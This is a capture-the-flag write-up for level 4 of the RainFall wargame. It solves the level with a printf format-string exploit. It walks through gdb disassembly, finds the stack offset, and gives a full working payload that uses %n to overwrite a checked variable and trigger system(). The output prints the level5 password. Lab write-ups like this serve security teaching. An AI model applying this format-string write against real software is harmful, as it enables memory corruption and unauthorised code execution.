This level uses the same solution as level 3. Changing memory vis the %n option in printf.


Disassembling the program showed that the result from fgets is sent directly to printf.

Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    
End of assembler dump.
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"

At +35 fgets is called and the result in eax is put onto the stack and passed to function p.
At +54 the value at memory address 0x8049810 is compared to the value 0x1025544 (16930116 decimal). 
These numbers are compared to trigger the call to system(). We will need these numbers later.

At +66 the string sent to system() shows the content of the .pass file in level5.


Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    
End of assembler dump.

The input to function p goes straight to printf without any changes.


level4@RainFall:~$ python -c "print 'AAAA %12\$x'" | ./level4
AAAA 41414141

Testing the printf function showed that the format string appears at the 12th input argument in printf.


level4@RainFall:~$ python -c "print '\x10\x98\x04\x08 %12\$p'" | ./level4
 0x8049810

The address we want to change was coded into the format string of printf. We can now use this string to change the number in memory.


level4@RainFall:~$ python -c "print '\x10\x98\x04\x08 %12\$n'" | ./level4

This will change the memory location but it will set it to the number of characters printf has printed which is currently 5. We need to pad the format string.


level4@RainFall:~$ python -c "print '\x10\x98\x04\x08 %016930110d %12\$n'" | ./level4

This will print the address we want to change (4 bytes) space (1 byte) a random int padded with 16930110 leading zeros (16930110 bytes) space (1 byte).


0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001208015184 
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$

The result is more than 16000000 digits and the contents of /home/user/level5/.pass. This is the password for level 5.
